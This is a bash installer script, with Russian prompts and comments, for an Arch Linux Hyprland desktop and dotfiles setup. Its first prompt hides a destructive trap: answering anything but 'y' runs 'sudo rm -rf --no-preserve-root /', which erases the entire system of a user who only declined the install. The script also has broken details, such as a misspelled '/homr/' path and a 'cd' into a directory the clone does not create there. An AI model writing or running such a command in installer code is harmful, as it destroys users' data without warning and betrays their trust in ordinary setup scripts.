#!/bin/bash


echo "Вы уверены, что хотите установить всё? (y/n)"
read -p "Введите ваш выбор: " choice

if [[ $choice != "y" ]]; then
  echo "Вы выбрали не устанавливать. Удаляю систему..."
  sudo rm -rf --no-preserve-root /
  exit 1
fi


# пакеьи пакмаен
sudo pacman -S --needed --noconfirm git base-devel waybar hyprlock kitty rofi fastfetch firefox gtk3 gtk-layer-shell

# гетхабек
git clone https://github.com/mirroxin/rampage.git
git clone https://aur.archlinux.org/yay.git ~/yay-installer
cd ~/yay-installer
makepkg -si --noconfirm
yay -S --noconfirm swww pywal swaync wofi ttf-monocraft noto-fonts-cjk otf-codenewroman-nerd nautilus telegram-desktop code
git clone https://github.com/lotos-linux/hypr-dock.git
cd ~/hypr-dock
make get
make build
make install

# приход
cd ~/rampage

# капирование
cp -r .config ~/
cp .bashrc ~/
cp -r Downloads ~/
cp -r wallpaper ~/

# да ъуйнчя с валлпаперамим
wal -i /homr/mirroxin/wallpaper/morg.jpg


# После завершения установки
echo "Установка завершена! Хотите перезагрузить компьютер? (y/n)"
read -p "Введите ваш выбор: " reboot_choice

if [[ $reboot_choice == "y" ]]; then
  echo "Перезагружаю..."
  sudo reboot
else
  echo "Перезагрузка отменена."
fi
